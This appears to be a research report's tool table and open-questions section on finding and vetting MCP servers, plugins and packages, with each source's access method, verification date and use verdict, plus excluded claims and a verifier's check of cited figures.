| Tool | Link | What it does | Where it runs | Verified | Verdict |
| --- | --- | --- | --- | --- | --- |
| Official MCP Registry API (re-test) | https://registry.modelcontextprotocol.io/openapi.yaml | Keyless `/v0.1/servers` with name-substring `search`, `version=latest`, `updated_since`; 14-23 s latency seen; namespace-verified, unmoderated for safety | curl | 2026-10-16 | **Use** as first MCP lead source with `version=latest`, vendor-namespace filter and timeout; hijack risk (155 expired-domain entries, Air Security 2026-08-27) |
| Smithery registry API | https://registry.smithery.ai/servers | Keyless search with `verified`, `useCount`; many unverified zero-use entries | curl | 2026-10-16 | Fallback (last-rung) lead source; docs and terms not opened; supersedes tool-routing.md Skip |
| PulseMCP API | https://api.pulsemcp.com/v0.1/servers | MCP directory API; 401 without key | curl | 2026-10-16 | Skip unless John provides a key |
| Glama API | https://glama.ai/api/mcp/v1/servers | MCP directory API; 401 without key; attribution licence | curl | 2026-10-16 | Skip unless John provides a key |
| mcp.so | https://mcp.so | MCP directory website; `/api/servers` returned HTML, no JSON API found | web | 2026-10-16 | Skip (no API); dead-link rate figure is worker inference, not quoted |
| GitHub MCP Registry | https://github.com/mcp | Curated list, 44 servers at launch (2025-10-24); 403 from cloud sandbox | web | 2026-10-16 (blog opened; page 403) | Manual lookup on John's machine only |
| Claude plugin marketplaces (official, community) | https://code.claude.com/docs/en/plugins/anthropic-marketplaces | Git-hosted `marketplace.json` catalogs; community passed automated screening; third-party not reviewed | Claude Code | 2026-10-16 | **Use** as second MCP/plugin source; greppable |
| Claude Connectors Directory | https://claude.com/docs/connectors/directory | Verified and Community remote MCP connectors; "Verification isn't a security audit" | claude.ai / Claude Code | 2026-10-16 | Use for named SaaS; no listing API found |
| Docker MCP Catalog / Toolkit | https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit | Docker-built signed `mcp/` images; Dynamic MCP search; `docker mcp catalog server ls` | Docker | 2026-10-16 | Use if Docker is present |
| awesome-mcp-servers (punkpeye) | http://github.com/punkpeye/awesome-mcp-servers | Community MCP list | web | 2026-10-16 | Orientation only |
| npm registry search API | https://registry.npmjs.org/-/v1/search | Keyless keyword search with downloads and dates; noisy | curl | 2026-10-16 | Confirm names, never choose with it |
| PyPI JSON / Simple API | https://docs.pypi.org/api/ | Exact-name metadata; XML-RPC search disabled | curl | 2026-10-16 | Use by exact name only |
| deps.dev API v3 | https://docs.deps.dev/api/v3/ | Keyless licences, advisory keys, deprecation, dependencies, Scorecard copy; caching permitted; no free-text search | curl | 2026-10-16 | **Use** for health, licence and footprint once a name is known |
| libraries.io API | https://libraries.io/api/search | Package search; 401 without key | curl | 2026-10-16 | Skip (key) |
| GitHub REST search | https://docs.github.com/en/rest/search/search | Repo/code search; 10/min unauth, code search 9-10/min and needs auth; 403 in cloud sandbox | curl / gh | 2026-10-16 | Use only on John's machine with a token |
| Docker Hub search API | https://hub.docker.com/v2/search/repositories | Keyless image search; 980 mostly unrelated hits for `mcp/stripe` | curl | 2026-10-16 | Fallback for CLI-as-image |
| OSV.dev API | https://google.github.io/osv.dev/api/ | Keyless `/v1/querybatch` advisories by package+version; docs say no limits; 0.32 s live | curl | 2026-10-16 | **Use** as the advisory check in triage |
| OpenSSF Scorecard REST API | https://api.scorecard.dev | Keyless JSON checks per repo; 404 when unscanned; weekly scans omit three checks | curl | 2026-10-16 | **Use** instead of the viewer URL; 404 = unavailable, not pass |
| npm provenance / attestations | https://docs.npmjs.com/generating-provenance-statements | Sigstore build link; keyless attestations endpoint; not a safety guarantee | curl, npm CLI | 2026-10-16 | Positive signal only |
| PyPI trusted publishing + attestations | https://docs.pypi.org/trusted-publishers/ | OIDC short-lived publishing tokens; attestations identify publisher | docs | 2026-10-16 | Positive signal; consumer check method unconfirmed |
| Snyk Advisor / security.snyk.io | https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/ | Advisor migrated into security.snyk.io (2 Feb 2026) | web | 2026-10-16 | Standalone Advisor gone; use deps.dev + Scorecard |
| Socket Firewall free (`sfw`) / depscore MCP | https://socket.dev/llms.txt | Keyless install-time malicious-package blocking; hosted depscore without auth; Free plan 1,000 scans/month, 500 API req/hour | CLI wrapper, hosted MCP | 2026-10-16 | Spike for npm/PyPI candidates |
| Snyk agent-scan (ex Invariant mcp-scan) | https://github.com/snyk/agent-scan | Apache-2.0 v0.6.9 scanner for MCP servers and skills (poisoning, shadowing, toxic flows); scanning can execute commands or make outbound requests; background mode reports to a Snyk Evo instance | local, sandbox only | 2026-10-16 (clone commit 3550263, not run) | Fallback; spike only inside a throwaway VM; never in triage |
| OWASP MCP Security Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html | Rug pull, hash pinning, typosquat checks | docs | 2026-10-16 | **Use** as the MCP vetting checklist |
| MCP spec Security Best Practices | https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices | Sandboxed local servers, scope minimisation, SSRF | docs | 2026-10-16 | **Use** for local vs remote server review |
| Thoughtworks tech radar process | https://www.thoughtworks.com/insights/blog/technology-strategy/how-to-create-your-enterprise-technology-radar | Re-review each edition; unchanged blips fade after two radars | web | 2026-10-16 (blog opened; BYOR repo not opened) | Borrow the fade and re-review rhythm; BYOR tool not evaluated |
| Cloudflare Code Mode | https://blog.cloudflare.com/code-mode/ | MCP tools as a TypeScript API; one code-execution tool; keys held by bindings | Cloudflare Workers sandbox (pattern) | 2026-10-16 | Reference design only; no gateway for one user |
| Anthropic code execution with MCP | https://www.anthropic.com/engineering/code-execution-with-mcp | Agent writes code against MCP servers; 150k to 2k tokens quoted; adds operational overhead | Claude Code with a code runtime | 2026-10-16 | Reference design; Bash already provides the runtime |
| Claude Code MCP tool search | https://code.claude.com/docs/en/mcp | Defers MCP tool definitions; disabled on non-first-party `ANTHROPIC_BASE_URL` | Claude Code | 2026-10-16 | Use (default on); check it is on behind any proxy |
| Anthropic multi-agent research system post | https://www.anthropic.com/engineering/multi-agent-research-system | Effort-scaling rules; 15x tokens vs chat | blog | 2026-10-16 | Evidence for envelope tiers |
| Budget-Constrained Agentic Search | https://arxiv.org/html/2603.08877v1 | Accuracy vs search depth; plateau near three searches | paper | 2026-10-16 | Evidence only |
| Diagnosing long-horizon search agents | https://arxiv.org/abs/2608.01913 | Effort and quality weakly aligned; stop on evidence sufficiency | paper | 2026-10-16 | Evidence only |
| MCP vs CLI scaffolding study | https://arxiv.org/abs/2608.08654 | Paired MCP-vs-CLI cost study; scaffolding dominates | paper | 2026-10-16 | Evidence; preprint, treat with care |
| Skills explained (Anthropic) | https://claude.com/blog/skills-explained | Skills vs MCP guidance: MCP connects, skills teach | blog | 2026-10-16 | Evidence for connector-plus-skill pairing |

## Open questions

**Claims excluded for lack of an opened source.** These are search text only, have no URL, or the quote was not returned verbatim.
1. The workers reported that Exa reliably returned primary docs pages in single calls. The evidence is "this run's Exa searches", with a search-excerpt quote and no opened URL. Excluded.
2. The workers reported that Parallel Search returned "Too Many Requests" on every call. This is a tool error seen in the run, with no URL. Excluded. Unresolved: whether this is a sandbox condition or a service limit. It bears on the routing default in tool-routing.md (E38).
3. The practitioner figures that MCP costs 4x to 35x more tokens than CLI (Fern https://buildwithfern.com/post/sdk-vs-cli-vs-mcp-choosing-interface, Numlytics https://numlytics.com/blog/mcp-vs-cli-vs-api-decision-framework/, Seongok Ryu https://seongokryu.github.io/posts/agent-tool-interface-landscape/) were seen in Exa highlights only. WebFetch on Fern returned a truncated placeholder. Excluded.
4. A 2026 course page saying the token argument against MCP "is out of date" was seen in search excerpts only. Excluded.
5. A third-party page claims Snyk Advisor "shut down in January 2026" (https://packagefix.dev/snyk-advisor-alternative). Search text only, and from the vendor of a competing tool. Excluded.
6. The claim that Snyk Advisor URLs now redirect to security.snyk.io package pages came from a Snyk summary. WebFetch returned only the migration sentence. Excluded.
7. That the `socket package` CLI needs a token (docs.socket.dev/docs/socket-package) is search text only. Excluded.
8. The Socket FAQ (static analysis of install scripts, network calls, env access) was not opened. Excluded.
9. The Invariant mcp-scan docs (tool pinning, E001-E003, W003 "Entity has changed") were seen in search text only. Excluded.
10. The claim that agent-scan sends tool descriptions to a remote analysis API with secrets redacted is search text only. Excluded. Only the README's "Snyk Evo" reporting line is cited (E68).
11. The Thoughtworks BYOR columns (name, ring, quadrant, isNew, description) and its AGPL licence are search text only. Excluded.
12. An OWASP guide sentence naming Scorecard and Snyk package health as scanners is search text only. Excluded.
13. That Scorecard's Maintained check skips projects under 90 days, and that Signed-Releases does not verify signatures, came from a WebFetch summary, not verbatim text. Excluded. The vetting note's inference that young repos are not assessed for Maintained therefore rests on an unquoted claim.

**Gaps from the notes** (not promoted to findings):
- Discovery sources:
  - No programmatic listing API was found for the Claude Connectors Directory, and it was not tested whether claude.com/plugins can be fetched by script.
  - Smithery API terms, rate limits and whether it needs a key at volume were not found.
  - Current server counts per registry were not measured.
  - github.com/mcp returned 403, so programmatic access is not established.
  - PulseMCP and Glama key signup cost and terms were not opened.
- Package discovery:
  - Sourcegraph, Context7 and DeepWiki coverage were not re-tested.
  - npm search limits and ranking weights were not opened.
  - The staleness of awesome lists was not measured.
  - GitHub topic search relevance could not be tested (403).
- Web search versus structured sources: there was no head-to-head test of Parallel, Exa and the registry on one SaaS-integration query.
- Ladder: there was no end-to-end test on a real SaaS need. The CLI-tool ordering has no cited source and is a hypothesis.
- Vetting signals:
  - The GitHub advisory REST unauthenticated rate limit is not stated, and the API returned 403 here.
  - The correct URL form for a PyPI consumer-side provenance check is unconfirmed: a guess at `pypi.org/integrity/...` returned 404.
  - deps.dev states no rate limit.
  - Release cadence and issue-response metrics have no single keyless API.
  - No detection benchmark for agent-scan or mcp-scan was opened.
  - Anthropic-specific MCP vetting guidance beyond the spec page was not searched.
- Registry: no real team's approved-tool list was found.
- Skills: the research and spike skills were not read for existing vetting steps. Repo-triage, system-map, researcher.md and spike-worker.md were not re-read; their facts come from the feasibility finding.
- Decision procedure:
  - The real token cost of the Attio, Clay and n8n MCP servers with tool search on was not measured.
  - The MCP spec auth text (2026-07-28 revision) was not read.
  - No vendor guidance exists for discovery inside a build, so the envelope numbers are untested design values.
  - DeepResearch Bench and similar evaluations were not read.
  - The card template file does not exist yet.
  - Where `docs/integrations/` lives is a plan decision.

**Registry hygiene.**
- Row "Glama / Smithery / mcpservers.org" (tool-registry.md:160) and tool-routing.md:154 still say Smithery is "Skip", with "no search API documented". This run's live test supersedes that for Smithery's search (E16). The older rows were not rewritten.
- The registry has two deps.dev rows from this run, one per note. They agree.

## Verification
Checked 2026-10-16 by the verifier. Sample: 20 cited claims.
Verified: 19. Unverified: 1.
- Unverified: "Vulnerability rate: about 4% of 19,000 MCP repos estimated exploitable" (Evidence E25) — https://www.trendaisecurity.com/en/resources-insights/deep-research/hunt-them-all-an-ai-powered-vulnerability-sweep-of-19-000-mcp-servers — page says the estimate is "between 600 and 1,650" repositories, "(3.1% – 8.6%)", not "about 4%". The 600 to 1,650 figure in the body (line 41) is verified.
